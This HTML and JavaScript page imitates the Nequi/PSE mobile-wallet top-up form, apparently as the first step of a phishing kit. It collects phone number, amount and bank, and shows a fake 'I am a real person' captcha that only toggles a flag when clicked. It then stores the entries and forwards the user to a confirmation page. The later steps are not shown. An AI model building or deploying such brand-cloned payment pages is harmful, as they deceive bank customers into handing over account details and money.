<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Recarga PSE Nequi</title>
  <link rel="icon" type="image/png" href="nequi-favicon-dark.svg">
  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"/>
  <style>
    :root {
      --font-family: "Manrope", sans-serif;
      --form-field: #f8f1f5;
      --uva: #200020;
      --uva-60: #796679;
      --orquidea: #da0081;
      --orquidea-30: #f1bfda;
      --positive: #11da7a;
      --negro: #000000;
      --white: #ffffff;
    }
 
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
    html, body {
      min-height: 100%;
      font-family: var(--font-family);
      -webkit-font-smoothing: antialiased;
      background: var(--white);
      color: var(--negro);
      line-height: 1.5;
    }
 
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 56px 24px;
    }
 
    .logo-wrap { margin-bottom: 24px; }
    .logo-wrap img { width: 104px; height: 32px; display: block; }
 
    h1 {
      font-weight: 700;
      font-size: 1.5rem;
      line-height: 2rem;
      text-align: center;
      color: var(--uva);
      margin-bottom: 1rem;
    }
 
    .form-wrap {
      width: 100%;
      max-width: 327.99px;
      display: flex;
      flex-direction: column;
      gap: 8px;
    }
 
    /* ── Campos de texto ── */
    .field { position: relative; width: 100%; }
    .field input {
      width: 100%;
      height: 48px;
      background-color: var(--form-field);
      border: 0;
      border-radius: 4px;
      padding: 20px 16px 6px;
      color: var(--uva);
      font-family: var(--font-family);
      font-size: 1rem;
      font-weight: 500;
      outline: none;
      -webkit-text-fill-color: var(--uva);
    }
 
    .field input::-webkit-outer-spin-button,
    .field input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
    .field input[type=number] { -moz-appearance: textfield; }
 
    .field label {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--uva);
      font-size: 1rem;
      font-weight: 500;
      transition: all 0.2s ease;
      pointer-events: none;
    }
 
    .field input:focus + label,
    .field input:not(:placeholder-shown) + label {
      top: 6px;
      transform: none;
      font-size: 0.68rem;
      font-weight: 700;
      color: var(--orquidea);
    }
 
    /* ── Select tipo de persona ── */
    .select-wrap { position: relative; width: 100%; }
 
    .select-wrap select {
      position: absolute;
      inset: 0;
      width: 100%;
      height: 100%;
      opacity: 0;
      cursor: pointer;
      z-index: 2;
    }
 
    .select-display {
      width: 100%;
      height: 48px;
      background-color: var(--form-field);
      border-radius: 4px;
      padding: 0 40px 0 16px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      gap: 1px;
      pointer-events: none;
    }
 
    .select-display .select-lbl {
      font-size: 0.68rem;
      font-weight: 700;
      color: var(--orquidea);
      line-height: 1.2;
    }
 
    .select-display .select-val {
      font-family: var(--font-family);
      font-size: 1rem;
      font-weight: 500;
      color: var(--uva);
      line-height: 1.2;
    }
 
    /* Flecha del select */
    .select-wrap::after {
      content: "";
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      width: 10px;
      height: 6px;
      background-color: var(--uva-60);
      clip-path: polygon(0 0, 100% 0, 50% 100%);
      pointer-events: none;
      z-index: 1;
    }
 
    /* ── Selector de banco ── */
    .banco-trigger { position: relative; cursor: pointer; width: 100%; }
 
    .banco-box {
      width: 100%;
      height: 48px;
      background-color: var(--form-field);
      border-radius: 4px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 0 40px 0 16px;
      gap: 1px;
    }
 
    .banco-box .banco-placeholder {
      font-size: 1rem;
      font-weight: 500;
      color: var(--uva);
      line-height: 1;
    }
 
    .banco-box .banco-lbl-mini {
      display: none;
      font-size: 0.68rem;
      font-weight: 700;
      color: var(--orquidea);
      line-height: 1.2;
    }
    .banco-box .banco-val {
      display: none;
      font-size: 1rem;
      font-weight: 500;
      color: var(--uva);
      line-height: 1.2;
    }
 
    .banco-box.selected .banco-placeholder { display: none; }
    .banco-box.selected .banco-lbl-mini { display: block; }
    .banco-box.selected .banco-val { display: block; }
 
    /* Flecha del banco */
    .banco-trigger::after {
      content: "";
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      width: 10px;
      height: 6px;
      background-color: var(--uva-60);
      clip-path: polygon(0 0, 100% 0, 50% 100%);
      pointer-events: none;
    }
 
    /* ── Mosparo ── */
    .mosparo-box {
      background: var(--white);
      border: 2px solid var(--orquidea-30);
      border-radius: 11px;
      display: flex;
      align-items: center;
      padding: 20px 24px;
      gap: 12px;
      cursor: pointer;
      position: relative;
    }
 
    .mosparo-circle {
      width: 40px;
      height: 40px;
      border: 3px solid var(--orquidea);
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex: 0 0 40px;
      position: relative;
      transition: 0.25s;
    }
 
    .mosparo-circle::before {
      content: "";
      display: block;
      position: absolute;
      inset: -3px;
      width: 40px;
      height: 40px;
      border: 1px solid var(--orquidea);
      border-radius: 20px;
      opacity: 0;
      transform: scale(1);
      transform-origin: center center;
      animation: mosparo__ping-animation 3s infinite;
    }
 
    @keyframes mosparo__ping-animation {
      0% { transform: scale(1); opacity: 0; }
      50% { opacity: 0.5; }
      100% { transform: scale(1.8); opacity: 0; }
    }
 
    .mosparo-box.loading .mosparo-circle::before,
    .mosparo-box.checked .mosparo-circle::before { display: none; }
 
    .mosparo-box.loading .mosparo-circle {
      border-top-color: transparent;
      animation: spin 0.8s linear infinite;
    }
 
    @keyframes spin { to { transform: rotate(360deg); } }
 
    .checkmark {
      display: none;
      width: 14px; height: 8px;
      border-left: 3px solid var(--positive);
      border-bottom: 3px solid var(--positive);
      transform: rotate(-45deg);
      margin-top: -3px;
    }
 
    .mosparo-box.checked { border-color: var(--positive); }
    .mosparo-box.checked .mosparo-circle { border-color: var(--positive); }
    .mosparo-box.checked .checkmark { display: block; }
 
    .mosparo-lbl { color: var(--uva); font-weight: 400; font-size: 16px; line-height: 22px; }
 
    /* ── Botón ── */
    .disclaimer { font-size: 0.8rem; color: var(--uva-60); text-align: center; margin: 10px 0; }
    .btn-continuar {
      height: 48px; background: var(--orquidea-30); color: #fff; border: none; border-radius: 8px;
      font-size: 1rem; font-weight: 700; cursor: not-allowed; transition: background 0.3s;
      width: 100%;
      font-family: var(--font-family);
    }
    .btn-continuar.active { background: var(--orquidea); cursor: pointer; }
 
    /* ── Modal bancos ── */
    .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 999; align-items: flex-end; justify-content: center; }
    .modal-overlay.open { display: flex; }
    .modal-sheet { background: #fff; border-radius: 24px 24px 0 0; width: 100%; max-width: 500px; padding: 24px 20px; }
    .bank-list { overflow-y: auto; list-style: none; max-height: 40vh; }
    .bank-list li { padding: 14px 0; border-bottom: 1px solid #F4F0F4; cursor: pointer; font-weight: 600; color: var(--uva); }
  </style>
</head>
<body>
 
  <div class="logo-wrap"><img src="feki-logo.svg" alt="Logo"></div>
  <h1>Recarga tu Nequi</h1>
 
  <div class="form-wrap">
    <div class="field">
      <input type="tel" id="cel1" placeholder=" " maxlength="10" oninput="update()">
      <label>Número de celular</label>
    </div>
    <div class="field">
      <input type="tel" id="cel2" placeholder=" " maxlength="10" oninput="update()">
      <label>Confirma el número de celular</label>
    </div>
    <div class="field">
      <input type="text" id="monto" placeholder=" " oninput="formatMonto(this)">
      <label>¿Cuánto?</label>
    </div>
 
    <!-- Select tipo de persona -->
    <div class="select-wrap">
      <div class="select-display">
        <span class="select-lbl">Tipo de persona</span>
        <span class="select-val" id="tipoDisplay">Natural</span>
      </div>
      <select id="tipo" onchange="actualizarTipo(this)">
        <option value="natural">Natural</option>
        <option value="juridica">Jurídica</option>
      </select>
    </div>
 
    <!-- Selector de banco -->
    <div class="banco-trigger" onclick="abrirModal()">
      <div class="banco-box" id="bancoBox">
        <span class="banco-placeholder">Elige el banco</span>
        <span class="banco-lbl-mini">Elige el banco</span>
        <span class="banco-val" id="bancoVal"></span>
      </div>
    </div>
 
    <div class="mosparo-box" id="mosparoBox" onclick="activarMosparo()">
      <div class="mosparo-circle" id="mosparoCircle"><div class="checkmark"></div></div>
      <div class="mosparo-lbl">Confirmo que soy una persona real.</div>
    </div>
 
    <p class="disclaimer">La recarga se hará usando los servicios de PSE y se debitará de tu cuenta corriente o de ahorros.</p>
    <button class="btn-continuar" id="btnContinuar">Continuar</button>
  </div>
 
  <div class="modal-overlay" id="modalOverlay">
    <div class="modal-sheet">
      <div class="bank-list" id="bankList"></div>
      <button onclick="cerrarModal()" style="width:100%; border:none; background:none; color:var(--orquidea); font-weight:700; padding:15px; font-family:var(--font-family); font-size:1rem;">Cerrar</button>
    </div>
  </div>
 
<script>
  const bancos = ["Bancolombia", "Davivienda", "Banco de Bogotá", "BBVA", "Nequi", "Daviplata", "Banco Falabella"];
  let bancoSel = '', verificado = false;
 
  function actualizarTipo(sel) {
    document.getElementById('tipoDisplay').textContent = sel.options[sel.selectedIndex].text;
  }
 
  function formatMonto(input) {
    let v = input.value.replace(/\D/g, "");
    input.value = v ? "$" + new Intl.NumberFormat('es-CO').format(v) : "";
    update();
  }
 
  function activarMosparo() {
    if (verificado) return;
    document.getElementById('mosparoBox').classList.add('checked');
    verificado = true;
    update();
  }
 
  function renderBancos() {
    const ul = document.getElementById('bankList');
    ul.innerHTML = '';
    bancos.forEach(b => {
      const li = document.createElement('li');
      li.textContent = b;
      li.onclick = () => {
        bancoSel = b;
        const box = document.getElementById('bancoBox');
        box.classList.add('selected');
        document.getElementById('bancoVal').textContent = b;
        cerrarModal();
        update();
      };
      ul.appendChild(li);
    });
  }
 
  function abrirModal() { document.getElementById('modalOverlay').classList.add('open'); renderBancos(); }
  function cerrarModal() { document.getElementById('modalOverlay').classList.remove('open'); }
 
  function update() {
    const c1 = document.getElementById('cel1').value;
    const c2 = document.getElementById('cel2').value;
    const m = document.getElementById('monto').value.replace(/\D/g, "");
    const ok = c1.length === 10 && c1 === c2 && parseInt(m) >= 1000 && bancoSel && verificado;
 
    const btn = document.getElementById('btnContinuar');
    btn.classList.toggle('active', ok);
    btn.onclick = ok ? guardarYEnviar : null;
  }
 
  function guardarYEnviar() {
    const data = {
      phoneNumber: document.getElementById('cel1').value,
      transactionValue: document.getElementById('monto').value,
      bankText: bancoSel.trim()
    };
    localStorage.setItem('formData', JSON.stringify(data));
    window.location.href = "confirmacion.html";
  }
</script>
</body>
</html>
